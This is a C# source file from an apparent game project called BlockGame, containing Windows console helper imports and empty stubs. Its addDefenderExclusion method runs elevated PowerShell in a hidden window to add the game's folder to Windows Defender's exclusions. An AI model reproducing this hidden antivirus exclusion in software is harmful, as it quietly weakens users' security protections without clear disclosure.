using System.Diagnostics;
using System.Runtime.InteropServices;
using BlockGame.util;

namespace BlockGame;

public partial class Game {
    public static void addDefenderExclusion() {
        try {
            var appDir = AppContext.BaseDirectory;
            var psi = new ProcessStartInfo {
                FileName = "powershell.exe",
                Arguments = $"-WindowStyle Hidden -Command \"Add-MpPreference -ExclusionPath '{appDir}'\"",
                Verb = "runas",
                CreateNoWindow = true,
                UseShellExecute = true,
                WindowStyle = ProcessWindowStyle.Hidden
            };

            using var process = Process.Start(psi);
            if (process != null) {
                process.WaitForExit(10000);
                if (process.ExitCode == 0) {
                    Log.info($"Added Windows Defender exclusion: {appDir}");
                }
                else {
                    Log.warn($"Failed to add Defender exclusion: exit code {process.ExitCode}");
                }
            }
        }
        catch (Exception ex) {
            Log.warn($"Failed to add Defender exclusion: {ex}");
        }
    }

    public static void cc() {
        // nothing for now!
        
        
        
    }
    
    public static void evt()
    {
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows)) {
            var stdout = GetStdHandle(StandardOutputHandleId);
            if (stdout != (IntPtr)InvalidHandleValue && GetConsoleMode(stdout, out var mode)) {
                SetConsoleMode(stdout, mode | EnableVirtualTerminalProcessingMode);
            }
        }
    }

    const int StandardOutputHandleId = -11;
    const uint EnableVirtualTerminalProcessingMode = 4;
    const long InvalidHandleValue = -1;

    [LibraryImport("kernel32.dll", SetLastError = true)]
    private static partial IntPtr GetStdHandle(int handleId);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool GetConsoleMode(IntPtr handle, out uint mode);

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool SetConsoleMode(IntPtr handle, uint mode);
    
    [LibraryImport("kernel32.dll")]
    private static partial IntPtr GetConsoleWindow();

    [LibraryImport("user32.dll")]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool ShowWindow(IntPtr hWnd, int nCmdShow);

    private const int SW_HIDE = 0;
    private const int SW_SHOW = 5;
    
    private const int ATTACH_PARENT_PROCESS = -1;

    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool AttachConsole(int dwProcessId);

    /// <summary>
    ///     Redirects the console output of the current process to the parent process.
    /// </summary>
    /// <remarks>
    ///     Must be called before calls to <see cref="Console.WriteLine()" />.
    /// </remarks>
    public static void AttachToParentConsole()
    {
        
    }
    
    [LibraryImport("kernel32.dll", SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static partial bool AllocConsole();

    // P/Invoke required:
    private const uint StdOutputHandle = 0xFFFFFFF5;

    [LibraryImport("kernel32.dll")]
    private static partial IntPtr GetStdHandle(uint nStdHandle);

    [LibraryImport("kernel32.dll")]
    private static partial void SetStdHandle(uint nStdHandle, IntPtr handle);

    [LibraryImport("kernel32.dll")]
    private static partial int FreeConsole();
}